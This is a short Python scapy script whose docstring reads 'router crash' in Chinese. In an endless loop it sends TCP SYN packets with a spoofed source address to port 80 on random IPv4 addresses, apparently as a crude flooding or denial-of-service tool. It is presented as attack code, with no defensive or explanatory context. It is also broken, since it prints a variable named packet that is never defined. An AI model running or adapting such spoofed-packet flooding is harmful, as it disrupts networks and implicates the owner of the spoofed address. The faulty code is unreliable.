import time
from scapy.all import *
from sys import argv
from random import randint
"""路由器崩溃"""



while 1:
    pdst="%i.%i.%i.%i"%(randint(1,254),randint(1,254),randint(1,254),randint(1,254))
    psrc="192.168.46.53"
    send(IP(psrc=psrc, pdst=pdst)/TCP(dport=80,flags="S"))
    time.sleep(0.5)
    print(packet.summary())